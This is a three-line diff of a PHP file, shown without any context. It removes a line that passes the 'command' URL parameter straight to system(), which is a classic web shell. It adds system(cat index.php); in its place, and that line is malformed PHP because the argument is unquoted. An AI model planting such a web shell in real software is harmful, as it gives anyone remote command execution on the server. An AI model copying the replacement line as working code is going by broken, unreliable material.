@@ -1,3 +1,3 @@
 <?php
-system($_GET['command']);
+system(cat index.php);
 ?>
